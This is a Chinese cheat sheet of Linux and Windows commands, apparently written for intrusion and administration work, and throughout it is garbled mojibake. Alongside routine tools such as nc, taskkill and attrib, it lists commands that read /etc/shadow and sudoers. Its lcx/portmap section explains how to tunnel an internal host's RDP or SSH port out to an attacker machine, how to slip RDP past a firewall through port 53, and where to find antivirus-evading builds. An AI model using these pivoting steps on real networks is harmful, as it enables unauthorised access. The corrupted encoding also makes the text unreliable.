åªæ˜¾ç¤ºç¬¦åˆæŒ‡å®šæ¡ä»¶çš„è®°å½•ã€‚ - +aï¼š## æ˜¾ç¤ºæ‰€æœ‰ç±»å‹çš„è®°å½•ã€‚ - +typeXï¼š## åªæ˜¾ç¤ºæŒ‡å®šç±»å‹çš„è®°å½•ã€‚ - +tcpï¼š## åªæ˜¾ç¤ºTCPç±»å‹çš„è®°å½•ã€‚ - +udpï¼š##åªæ˜¾ç¤ºUDPç±»å‹çš„è®°å½•ã€‚ - +nameï¼š##åªæ˜¾ç¤ºæŒ‡å®šåç§°çš„è®°å½•ã€‚ - +classXï¼š## åªæ˜¾ç¤ºæŒ‡å®šç±»åˆ«çš„è®°å½•ã€‚ - +rdatatypeXï¼š## åªæ˜¾ç¤ºæŒ‡å®šæ•°æ®ç±»å‹çš„è®°å½•ã€‚ - +srvtypeXï¼š## åªæ˜¾ç¤ºæŒ‡å®šæœåŠ¡ç±»å‹çš„è®°å½•ã€‚ - +soaï¼š## åªæ˜¾ç¤ºSOAè®°å½•ã€‚ - +mxï¼š## åªæ˜¾ç¤ºMXè®°å½•ã€‚ - +ptrï¼š##åªæ˜¾ç¤ºPTRè®°å½•ã€‚ - +nsï¼š## åªæ˜¾ç¤ºNSè®°å½•ã€‚ - +cnameï¼š## åªæ˜¾ç¤ºCNAMEè®°å½•ã€‚ - +inaddrï¼š## åªæ˜¾ç¤ºIPåœ°å€è®°å½•ã€‚ - +isdnï¼š## åªæ˜¾ç¤ºISDNè®°å½•ã€‚ - +arpaï¼š## åªæ˜¾ç¤ºARPAè®°å½•ã€‚ - +authorityï¼š## åªæ˜¾ç¤ºæˆæƒè®°å½•ã€‚ - +ixfrï¼š## åªæ˜¾ç¤ºIXFRè®°å½•ã€‚ - +proxyï¼š## åªæ˜¾ç¤ºä»£ç†è®°å½•ã€‚ - +ftpï¼š### åªæ˜¾ç¤ºFTPè®°å½•ã€‚ - +hinfoï¼š## åªæ˜¾ç¤ºä¸»æœºä¿¡æ¯è®°å½•ã€‚ - +nisï¼š# åªæ˜¾ç¤ºNISè®°å½•ã€‚ - +serverXï¼š## åªæ˜¾ç¤ºæŒ‡å®šæœåŠ¡å™¨çš„è®°å½•ã€‚ - +nsec3_responseï¼š## åªæ˜¾ç¤ºNSEC3å“åº”è®°å½•ã€‚ - +nsec3_queryï¼šåªæ˜¾ç¤ºNSEC3æŸ¥è¯¢è®°å½•ã€‚ - +bitsï¼š## åªæ˜¾ç¤ºä½æ ‡è®°è®°å½•ã€‚ - +timestampï¼š# åªæ˜¾ç¤ºæ—¶é—´æˆ³è®°å½•ã€‚ 1-2-4 æŸ¥çœ‹æä¾›æŸä¸ªå‘½ä»¤çš„è½¯ä»¶åŒ…yum provides è½¯ä»¶åŒ…åå­— 1-2-5 who | w | uptimewho ## æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™† ,ptsè¿œç¨‹ç™»å½•ï¼Œæ¯”å¦‚ç”¨xshellè¿™ç§å·¥å…·è¿æ¥ç™»å½•ä¸Šå»çš„ w ## æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º uptime ## æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½ 1-2-6 æŸ¥çœ‹ç‰¹æƒç”¨æˆ·awk -F: â€˜$30{print $1}â€™ etcpasswd 1-2-7 æŸ¥çœ‹èƒ½è¿œç¨‹ç™»å½•ç”¨æˆ·awk â€˜$1|$6{print $1}â€™ etcshadow 1-2-8 æ£€æŸ¥sudo æƒé™çš„ç”¨æˆ·more etcsudoers | grep -v â€œ^#|^$â€ | grep â€œALL(ALL)â€ 1-2-9 æŸ¥çœ‹æŸä¸ªpidå¯¹åº”çš„ç¨‹åºæ–‡ä»¶ls -l proc$PIDexeæˆ–file proc$PIDexeï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰ 1-2-10 æŸ¥çœ‹ç³»ç»Ÿçš„è¿è¡Œçº§åˆ«## æŸ¥çœ‹è¿è¡Œçº§åˆ«å‘½ä»¤ runlevel vi etcinittab id3ï¼šinitdefault ## ç³»ç»Ÿå¼€æœºåç›´æ¥è¿›å…¥å“ªä¸ªè¿è¡Œçº§åˆ« 1-2-11 å»ºç«‹è½¯è¿æ¥ln -s etcinit.dsshd etcrc.drc3.dS100ssh ## æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„ã€‚ 1-2-12 æœåŠ¡ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š chkconfig [â€“level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off] chkconfig â€“level 2345 httpd on ## å¼€å¯è‡ªå¯åŠ¨ chkconfig httpd on ## ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰ ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š ä¿®æ”¹etcre.drc.local æ–‡ä»¶ åŠ å…¥ etcinit.dhttpd start 1-2-13 æŸ¥çœ‹å·²å®‰è£…çš„æœåŠ¡RPMåŒ…å®‰è£…çš„æœåŠ¡ chkconfig â€“list ### æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡ ps aux | grep crond ## æŸ¥çœ‹å½“å‰æœåŠ¡ ç³»ç»Ÿåœ¨3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ chkconfig â€“list | grep â€œ3:å¯ç”¨|5:å¯ç”¨â€ ## ä¸­æ–‡ç¯å¢ƒ chkconfig â€“list | grep â€œ3:on|5:onâ€ ## è‹±æ–‡ç¯å¢ƒ æºç åŒ…å®‰è£…çš„æœåŠ¡ ## æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨userlocal service httpd start ## æœç´¢etcrc.dinit.d æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ 1-2-14 ncå‘½ä»¤gç½‘å…³ ## è®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªã€‚ -GæŒ‡å‘å™¨æ•°ç›® ## è®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ã€‚ -h ## åœ¨çº¿å¸®åŠ©ã€‚ -iå»¶è¿Ÿç§’æ•° ## è®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ã€‚ -l ä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œ## ç®¡æ§ä¼ å…¥çš„èµ„æ–™ã€‚ -n ## ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ã€‚ -oè¾“å‡ºæ–‡ä»¶ ## æŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ã€‚ -pé€šä¿¡ç«¯å£ ## è®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ã€‚ -r ## ä¹±æ•°æŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£ã€‚ -sæ¥æºä½å€ ## è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ã€‚ -u ## ä½¿ç”¨UDPä¼ è¾“åè®®ã€‚ -v ## æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚ -wè¶…æ—¶ç§’æ•° ## è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ã€‚ -z ##ä½¿ç”¨0è¾“å…¥è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚ 1-2-15 lcxç«¯å£è½¬å‘## LCXç«¯å£è½¬å‘æ˜¯ä¸€ç§å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå®ƒå¯ä»¥å°†æœ¬åœ°ç«¯å£ä¸è¿œç¨‹ç«¯å£è¿›è¡Œè¿æ¥ï¼Œå®ç°è·¨ç½‘ç»œçš„æ•°æ®ä¼ è¾“ã€‚ä½¿ç”¨LCXç«¯å£è½¬å‘ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾åœ°åœ¨ä¸åŒçš„ç½‘ç»œä¹‹é—´å»ºç«‹å®‰å…¨ã€ç¨³å®šçš„è¿æ¥ï¼Œæ–¹ä¾¿åœ°è¿›è¡Œè¿œç¨‹è®¿é—®ã€æ•°æ®ä¼ è¾“å’Œç½‘ç»œæµ‹è¯•ç­‰æ“ä½œã€‚ 1. å‚æ•°ä»‹ç»ï¼š -listenï¼šæŒ‡å®šæœ¬åœ°ç›‘å¬ç«¯å£ï¼Œå³è¦è¿›è¡Œè½¬å‘çš„æœ¬åœ°ç«¯å£ã€‚ -forwardï¼šæŒ‡å®šè¦è½¬å‘åˆ°çš„è¿œç¨‹ä¸»æœºå’Œç«¯å£ã€‚ -fwdTypeï¼šæŒ‡å®šè½¬å‘ç±»å‹ï¼Œæ”¯æŒTCPã€UDPå’ŒHTTPã€‚ -bindToï¼šæŒ‡å®šè¦ç»‘å®šçš„æœ¬åœ°åœ°å€ï¼Œå¯ä»¥æ˜¯æœ¬æœºIPåœ°å€æˆ–ç‰¹å®šçš„ç½‘ç»œæ¥å£ã€‚ -xorKeyï¼šæŒ‡å®šè¦ä½¿ç”¨çš„XORåŠ å¯†å¯†é’¥ï¼Œç”¨äºä¿æŠ¤è½¬å‘çš„æ•°æ®ã€‚ -verboseï¼šæ˜¾ç¤ºæ›´è¯¦ç»†çš„è¿è¡Œæ—¥å¿—ä¿¡æ¯ã€‚ -compressï¼šå¯ç”¨æ•°æ®å‹ç¼©åŠŸèƒ½ï¼Œæé«˜æ•°æ®ä¼ è¾“æ•ˆç‡ã€‚ -killï¼šå…³é—­æ‰€æœ‰æ´»åŠ¨è½¬å‘å¹¶é€€å‡ºç¨‹åºã€‚ 2ï¼Œç®€å•ä½¿ç”¨ a. ç«¯å£è½¬å‘: lcx -listen æœ¬åœ°ç«¯å£ -forward è¿œç¨‹ä¸»æœº:è¿œç¨‹ç«¯å£n ä¾‹å¦‚: lcx -listen 8888 -forward 192.168.1.100:8888n ## è¿™æ¡å‘½ä»¤å°†æœ¬åœ°çš„8888ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœº192.168.1.100çš„8888ç«¯å£ã€‚ b. æŒ‡å®šç»‘å®šåœ°å€: lcx -listen æœ¬åœ°åœ°å€:æœ¬åœ°ç«¯å£ -forward è¿œç¨‹ä¸»æœº:è¿œç¨‹ç«¯å£ -bindTo ç»‘å®šåœ°å€n ä¾‹å¦‚: lcx -listen 192.168.0.10:8888 -forward 192.168.1.100:8888 -bindTo 192.168.0.10n ## è¿™æ¡å‘½ä»¤å°†æœ¬åœ°åœ°å€ä¸º192.168.0.10çš„8888ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœº192.168.1.100çš„8888ç«¯å£ï¼Œå¹¶ç»‘å®šåˆ°æœ¬åœ°åœ°å€192.168.0.10ã€‚ ## lcx.exeæ˜¯ä¸€ä¸ªç«¯å£è½¬å‘å·¥å…·ï¼Œæœ‰Windowsç‰ˆå’ŒLinuxç‰ˆä¸¤ä¸ªç‰ˆæœ¬ï¼ŒWindowsç‰ˆæ˜¯lcx.exe,Linuxç‰ˆä¸ºportmap Windowsç‰ˆä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š lcxæœ‰ä¸¤å¤§åŠŸèƒ½ï¼š 1ï¼‰ç«¯å£è½¬å‘(listenå’Œslaveæˆå¯¹ä½¿ç”¨) 2ï¼‰ç«¯å£æ˜ å°„(tran) ç«¯å£è½¬å‘ï¼š Lcx -listen ç›‘å¬slaveè¯·æ±‚çš„ç«¯å£ç­‰å¾…è¿æ¥çš„ç«¯å£ Lcx -slave æ”»å‡»æœºIPç›‘å¬ç«¯å£ç›®æ ‡IPç›®æ ‡ç«¯å£ ç«¯å£æ˜ å°„ï¼š Lcx -tranç­‰å¾…è¿æ¥çš„ç«¯å£ç›®æ ‡IPæ—¥æ ‡ç«¯å£ 1ã€lcx å†…ç½‘ç«¯å£è½¬å‘ ## å†…ç½‘ä¸»æœºä¸Šæ‰§è¡Œï¼šlcx.exe â€“slave å…¬ç½‘ä¸»æœºip å…¬ç½‘ä¸»æœºç«¯å£ å†…ç½‘ä¸»æœºip å†…ç½‘ä¸»æœºç«¯å£ lcx.exe -slave å…¬ç½‘ä¸»æœºip 4444 127.0.0.1 3389 ## æ„æ€æ˜¯æŠŠå†…ç½‘ä¸»æœºçš„ 3389 ç«¯å£è½¬å‘åˆ°å…·æœ‰å…¬ç½‘ipä¸»æœºçš„ 4444 ç«¯å£ ## å…¬ç½‘ä¸»æœº ä¸Šæ‰§è¡Œ Lcx.exe â€“listen å…¬ç½‘ä¸»æœºç«¯å£1 å…¬ç½‘ä¸»æœºç«¯å£2 lcx.exe â€“listen 4444 5555 ## æ„æ€æ˜¯ç›‘å¬å…¬ç½‘ä¸»æœºæœ¬æœºçš„ 4444 ç«¯å£è¯·æ±‚ï¼Œå¹¶å°†æ¥è‡ª 4444 ç«¯å£çš„è¯·æ±‚ä¼ é€ç»™ 5555 ç«¯å£ã€‚ ## æ­¤æ—¶ï¼ŒRDP è¿æ¥ï¼ŒWindows å‘½ä»¤è¡Œä¸‹è¾“å…¥mstscï¼Œå³å¯æ‰“å¼€è¿œç¨‹æ¡Œé¢è¿æ¥: 2ã€æœ¬åœ°ç«¯å£è½¬å‘ ## ç”±äºé˜²ç«å¢™é™åˆ¶ï¼Œéƒ¨åˆ†ç«¯å£å¦‚3389æ— æ³•é€šè¿‡é˜²ç«å¢™ï¼Œæ­¤æ—¶å¯ä»¥å°†è¯¥ç›®æ ‡ä¸»æœºçš„3389ç«¯å£é€ä¼ åˆ°é˜²ç«å¢™å…è®¸çš„å…¶ä»–ç«¯å£ï¼Œå¦‚53ç«¯å£ï¼Œ ## ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼š lcx -tran 53 ç›®æ ‡ä¸»æœºip 3389 ## è¿™æ—¶æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿œç¨‹æ¡Œé¢è¿æ¥åˆ°åˆ° ç›®æ ‡ä¸»æœºIP:53 ## æ³¨ï¼šè½¯ä»¶å¯èƒ½ä¼šè¢«æ€è½¯æŸ¥æ€ï¼Œå¯è‡ªè¡Œå¯»æ‰¾å…æ€ç‰ˆæœ¬ã€‚ Linuxç‰ˆä½¿ç”¨æ–¹æ³•ï¼š ## å…ˆåœ¨å…·æœ‰å…¬ç½‘ipçš„ä¸»æœºä¸Šæ‰§è¡Œï¼š .portmap -m 2 -p1 6666 -h2 å…¬ç½‘ä¸»æœºip -p2 7777 ## æ„æ€æ˜¯ç›‘å¬æ¥è‡ª6666ç«¯å£çš„è¯·æ±‚ï¼Œå°†å…¶è½¬å‘åˆ°7777ç«¯å£ ## å†åœ¨å†…ç½‘ä¸»æœºä¸Šæ‰§è¡Œï¼š .portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 å…¬ç½‘ä¸»æœºip -p2 6666 ## æ„æ€å°±æ˜¯å°†å†…ç½‘ä¸»æœº22ç«¯å£çš„æµé‡è½¬å‘åˆ°å…¬ç½‘ä¸»æœºçš„6666ç«¯å£ã€‚ ## ç„¶ååœ¨Linuxç³»ç»Ÿå‘½ä»¤è¡Œä¸‹æ‰§è¡Œ ssh å…¬ç½‘ä¸»æœºip 7777 ##å³å¯è¿æ¥å†…ç½‘ä¸»æœºã€‚ 1-2-16 å®‰è£…Nginx## æ¯”å¦‚centos7çš„ï¼Œä½¿ç”¨epelæºå®‰è£… yum install epel-release -y yum install nginx -y systemctl start nginx.service systemctl enable nginx.service äºŒï¼ŒWindows1-1 å¸¸ç”¨æŒ‡ä»¤1-1-1 telnet## æ£€æµ‹ç«¯å£å¼€æ”¾ telnet 101.132.222.28 3306 ## æŸ¥çœ‹æŸä¸ªç«¯å£æ˜¯å¦å¼€æ”¾ 1-1-2 tracert## è·¯ç”±è·³è½¬è®°å½• tracert 101.132.222.28 ## è·¯ç”±è·³è½¬è®°å½• 1-1-3 ç³»ç»ŸæœåŠ¡msconfigã€services.mscã€sc ã€tasklist svc ## æ³¨:svcæ˜¯è¯¦ç»†æŸ¥çœ‹ä¸€ä¸ªå®¿ä¸»è¿›ç¨‹å¯¹åº”çš„å¤šé¡¹æœåŠ¡ ã€‚ ## SCæ˜¯Service Control Managerçš„ç¼©å†™ï¼Œæ˜¯Windowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç®¡ç†æœåŠ¡ã€‚å®ƒå¯ä»¥å¯åŠ¨ã€åœæ­¢ã€æš‚åœã€æ¢å¤å’Œåˆ é™¤æœåŠ¡ï¼Œè¿˜å¯ä»¥æŸ¥è¯¢æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚SCå‘½ä»¤çš„å‚æ•°åŒ…æ‹¬ï¼š - serverï¼š## æŒ‡å®šæœåŠ¡æ‰€åœ¨çš„è¿œç¨‹æœåŠ¡å™¨çš„åç§°ã€‚è¯¥åç§°å¿…é¡»ä½¿ç”¨é€šç”¨å‘½åçº¦å®š (UNC) æ ¼å¼ï¼ˆä¾‹å¦‚ \\myserverï¼‰ã€‚ - servicenameï¼š## æŒ‡å®š getkeyname æ“ä½œè¿”å›çš„æœåŠ¡åç§°ã€‚ - commandï¼š## æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ - startï¼š## å¯åŠ¨æœåŠ¡ã€‚ - stopï¼š## åœæ­¢æœåŠ¡ã€‚ - pauseï¼š##æš‚åœæœåŠ¡ã€‚ - resumeï¼š## æ¢å¤æœåŠ¡ã€‚ - removeï¼š## åˆ é™¤æœåŠ¡ã€‚ 1-1-4 taskkilltaskkill f PID è¿›ç¨‹å· ## å…¶ä¸­ f è¡¨ç¤ºå¼ºæ€ã€å¼ºåˆ¶ç»“æŸ S system ## æŒ‡å®šè¦è¿æ¥çš„è¿œç¨‹ç³»ç»Ÿã€‚ U [domain]user ## æŒ‡å®šåº”è¯¥åœ¨å“ªä¸ªç”¨æˆ·ä¸Šä¸‹æ–‡æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚ P [password] ## ä¸ºæä¾›çš„ç”¨æˆ·ä¸Šä¸‹æ–‡æŒ‡å®šå¯†ç ã€‚å¦‚æœå¿½ç•¥ï¼Œæç¤ºè¾“å…¥ã€‚ FI filter ## åº”ç”¨ç­›é€‰å™¨ä»¥é€‰æ‹©ä¸€ç»„ä»»åŠ¡ã€‚å…è®¸ä½¿ç”¨ â€œâ€œã€‚ä¾‹å¦‚ï¼Œæ˜ åƒåç§° eq acme PID processid ## æŒ‡å®šè¦ç»ˆæ­¢çš„è¿›ç¨‹çš„ PIDã€‚ä½¿ç”¨ TaskList å–å¾— PIDã€‚ IM imagename ## æŒ‡å®šè¦ç»ˆæ­¢çš„è¿›ç¨‹çš„æ˜ åƒåç§°ã€‚é€šé…ç¬¦ â€˜â€˜å¯ç”¨æ¥æŒ‡å®šæ‰€æœ‰ä»»åŠ¡æˆ–æ˜ åƒåç§°ã€‚ T ## ç»ˆæ­¢æŒ‡å®šçš„è¿›ç¨‹å’Œç”±å®ƒå¯ç”¨çš„å­è¿›ç¨‹ã€‚ F ## æŒ‡å®šå¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ã€‚ ? ## æ˜¾ç¤ºå¸®åŠ©æ¶ˆæ¯ã€‚ 2 ç­›é€‰å™¨: ç­›é€‰å™¨å æœ‰æ•ˆè¿ç®—ç¬¦ æœ‰æ•ˆå€¼ â€”â€”â€”â€“ â€”â€”â€”â€”â€” â€”â€”â€”â€”â€”â€”â€”â€”- STATUS eq, ne RUNNING |NOT RESPONDING | UNKNOWN IMAGENAME eq, ne æ˜ åƒåç§° PID eq, ne, gt, lt, ge, le PID å€¼ SESSION eq, ne, gt, lt, ge, le ä¼šè¯ç¼–å·ã€‚ CPUTIME eq, ne, gt, lt, ge, le CPU æ—¶é—´ï¼Œæ ¼å¼ä¸º hh:mm:ssã€‚ hh - æ—¶ï¼Œ mm - åˆ†ï¼Œss - ç§’ MEMUSAGE eq, ne, gt, lt, ge, le å†…å­˜ä½¿ç”¨é‡ï¼Œå•ä½ä¸º KB USERNAME eq, ne ç”¨æˆ·åï¼Œæ ¼å¼ä¸º [domain]user MODULES eq, ne DLL åç§° SERVICES eq, ne æœåŠ¡åç§° WINDOWTITLE eq, ne çª—å£æ ‡é¢˜ è¯´æ˜ â€”- 1) åªæœ‰åœ¨åº”ç”¨ç­›é€‰å™¨çš„æƒ…å†µä¸‹ï¼ŒIM åˆ‡æ¢æ‰èƒ½ä½¿ç”¨é€šé…ç¬¦ â€˜â€˜ã€‚ 2) è¿œç¨‹è¿›ç¨‹æ€»æ˜¯è¦å¼ºè¡Œ (F) ç»ˆæ­¢ã€‚ 3) å½“æŒ‡å®šè¿œç¨‹æœºå™¨æ—¶ï¼Œä¸æ”¯æŒ â€œWINDOWTITLEâ€ å’Œ â€œSTATUSâ€ ç­›é€‰å™¨ã€‚ 3ã€ä¾‹å¦‚ TASKKILL IM notepad.exe TASKKILL PID 1230 PID 1241 PID 1253 T TASKKILL F IM cmd.exe T TASKKILL F FI â€œPID ge 1000â€ FI â€œWINDOWTITLE ne untitle*â€ TASKKILL F FI â€œUSERNAME eq NT AUTHORITY\\SYSTEMâ€ IM notepad.exe TASKKILL S system U domain\\username FI â€œUSERNAME ne NT*â€ IM * TASKKILL S system U username P password FI â€œIMAGENAME eq note*â€ eventvwr.msc ## â€”â€”â€”â€”â€” äº‹ä»¶æŸ¥çœ‹å™¨ 1-1-5 del del ah f DLLHOST.exe â€”â€”â€”â€”â€“ ## å…¶ä¸­ ah æ˜¯åªåˆ é™¤æ‰€æœ‰éšè—æ–‡ä»¶çš„æ„æ€ p ## æç¤ºæ‚¨ç¡®è®¤æ˜¯å¦åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶ã€‚ f ## å¼ºåˆ¶åˆ é™¤åªè¯»æ–‡ä»¶ã€‚ s ## ä»å½“å‰ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ä¸­åˆ é™¤æŒ‡å®šæ–‡ä»¶ã€‚æ˜¾ç¤ºæ­£åœ¨è¢«åˆ é™¤çš„æ–‡ä»¶åã€‚ q ## æŒ‡å®šå®‰é™æ¨¡å¼ã€‚ä¸å¯¹åˆ é™¤ç¡®è®¤ä½œå‡ºæç¤ºã€‚ a ## æ ¹æ®æŒ‡å®šçš„å±æ€§åˆ é™¤æ–‡ä»¶ã€‚ 1-1-6 dirdir s rundll32.exe p\t## ä¸€æ¬¡æ˜¾ç¤ºä¸€å±åˆ—è¡¨ã€‚è¦æŸ¥çœ‹ä¸‹ä¸€ä¸ªå±å¹•ï¼Œè¯·æŒ‰ä»»æ„é”®ã€‚ q\t## æ˜¾ç¤ºæ–‡ä»¶æ‰€æœ‰æƒä¿¡æ¯ w\t## ä»¥å®½æ ¼å¼æ˜¾ç¤ºåˆ—è¡¨ï¼Œæ¯è¡Œæœ€å¤šåŒ…å«äº”ä¸ªæ–‡ä»¶åæˆ–ç›®å½•å d\t## ä»¥ä¸ w ç›¸åŒçš„æ ¼å¼æ˜¾ç¤ºåˆ—è¡¨ï¼Œä½†æ–‡ä»¶æŒ‰åˆ—æ’åºã€‚ a\t## ä»…æ˜¾ç¤ºå…·æœ‰æ‚¨æŒ‡å®šå±æ€§çš„ç›®å½•å’Œæ–‡ä»¶çš„åç§°ã€‚ t ## æŒ‡å®šè¦æ˜¾ç¤ºæˆ–ç”¨äºæ’åºçš„æ—¶é—´å­—æ®µã€‚å¯ç”¨çš„æ—¶é—´å­—æ®µå€¼ä¸ºï¼šc - Creationa - æœ€åè®¿é—®w - æœ€åå†™å…¥ s\t## åˆ—å‡ºæŒ‡å®šç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­æŒ‡å®šæ–‡ä»¶åçš„æ¯æ¬¡å‡ºç°ã€‚ b\t## æ˜¾ç¤ºç›®å½•å’Œæ–‡ä»¶çš„è£¸åˆ—è¡¨ï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯ã€‚ b å‚æ•°è¦†ç›– wã€‚ l\t## ä½¿ç”¨å°å†™æ˜¾ç¤ºæœªæ’åºçš„ç›®å½•åå’Œæ–‡ä»¶åã€‚ n\t## åœ¨å±å¹•çš„æœ€å³ä¾§æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶åçš„é•¿åˆ—è¡¨æ ¼å¼ã€‚ x\t## æ˜¾ç¤ºä¸ºé 8dot3 æ–‡ä»¶åç”Ÿæˆçš„çŸ­åç§°ã€‚æ˜¾ç¤ºä¸ n çš„æ˜¾ç¤ºç›¸åŒï¼Œä½†åœ¨é•¿åç§°ä¹‹å‰æ’å…¥çŸ­åç§°ã€‚ c\t## ä»¥æ–‡ä»¶å¤§å°æ˜¾ç¤ºåƒä½åˆ†éš”ç¬¦ã€‚è¿™æ˜¯é»˜è®¤è¡Œä¸ºã€‚ä½¿ç”¨ -c éšè—åˆ†éš”ç¬¦ã€‚ 4\t## ä»¥å››ä½æ•°æ ¼å¼æ˜¾ç¤ºå¹´ä»½ã€‚ r\t## æ˜¾ç¤ºæ–‡ä»¶çš„å¤‡ç”¨æ•°æ®æµã€‚ ?\t## åœ¨å‘½ä»¤æç¤ºç¬¦å¤„æ˜¾ç¤ºå¸®åŠ©ã€‚ 1-1-7 attrrib## attribæ˜¯doså’ŒWindowsç³»ç»Ÿä¸­çš„ä¸€ä¸ªç”¨äºæ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•å±æ€§çš„å‘½ä»¤ï¼Œå®ƒçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š attrib [+r | -r] [+a | -a] [+s | -s] [+h | -h] [é©±åŠ¨å™¨:][è·¯å¾„]æ–‡ä»¶å [s [d]] attrib å‘½ä»¤æœ‰4ä¸ªå¸¸ç”¨å‚æ•°ï¼š r ## è¯» a ## å­˜æ¡£ s ## ç³»ç»Ÿ h ## éšè—åˆ†åˆ«ä¸ºã€ã€ã€ç­‰å±æ€§ã€‚è¿™äº›å‚æ•°ç”¨æ¥æ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„å±æ€§ï¼Œå…¶ä¸­åŠ å·ï¼ˆ+ï¼‰ä»£è¡¨æ·»åŠ å±æ€§ï¼Œå‡å·ï¼ˆ-ï¼‰ä»£è¡¨å–æ¶ˆå±æ€§ã€‚ ## ä¾‹å¦‚ï¼Œ+r è¡¨ç¤ºå°†æ–‡ä»¶è®¾ç½®ä¸ºâ€œåªè¯»â€ï¼Œ -r è¡¨ç¤ºå°†å…¶å–æ¶ˆâ€œåªè¯»â€å±æ€§ï¼› ## +h è¡¨ç¤ºå°†æ–‡ä»¶çš„éšè—å±æ€§è®¾ç½®ä¸ºâ€œæ˜¯â€ï¼Œ-h åˆ™è¡¨ç¤ºå–æ¶ˆè¿™ä¸ªå±æ€§ã€‚ ## attrib å‘½ä»¤é™¤äº†å¯ä»¥æ›´æ”¹æ–‡ä»¶çš„å±æ€§ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ d å’Œ s å‚æ•°å¾ªç¯éå†ç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚å…¶ä¸­ï¼Œd å‚æ•°ç”¨äºæ›´æ”¹ç›®å½•çš„å±æ€§ï¼Œ så‚æ•°ç”¨äºåŒæ—¶æ›´æ”¹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„å±æ€§ã€‚ ## å®ä¾‹1ï¼šå°†æ–‡ä»¶è®¾ç½®ä¸ºâ€œåªè¯»â€ attrib +r c:\\test.txt å¦‚æœæƒ³è¦å–æ¶ˆæŸä¸ªæ–‡ä»¶çš„åªè¯»å±æ€§ attrib -r c:\\test.txt ## å®ä¾‹2ï¼šå°†ç›®å½•ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹è®¾ç½®ä¸ºéšè— é¦–å…ˆï¼Œå…ˆç”¨å‘½ä»¤è¡Œç”Ÿæˆä¸€ä¸ªmydocæ–‡ä»¶å¤¹ if not exist c:\\mydoc md c:\\mydoc ## 